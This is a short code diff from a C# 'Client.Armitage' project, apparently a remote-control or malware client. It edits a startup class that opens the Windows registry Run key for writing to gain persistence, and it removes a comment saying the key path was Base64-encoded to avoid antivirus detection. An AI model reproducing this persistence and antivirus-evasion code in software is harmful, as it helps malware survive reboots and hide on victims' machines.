@@ -13,9 +13,8 @@ namespace Client.Armitage
     /// </summary>
     public static class Startup
     {
-        // the registry path needs to be obfuscate to prevent AV detection
         private static RegistryKey RegistryStartupFolder =
-            Registry.CurrentUser.OpenSubKey(Utilities.Encryptions_And_Decryptions.Base64Decode("U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1bg=="), true);
+            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 
         /// <param name="filepath">If null, uses current process' file path.</param>
         public static bool ViaTaskScheduler(string name, string filepath = null)
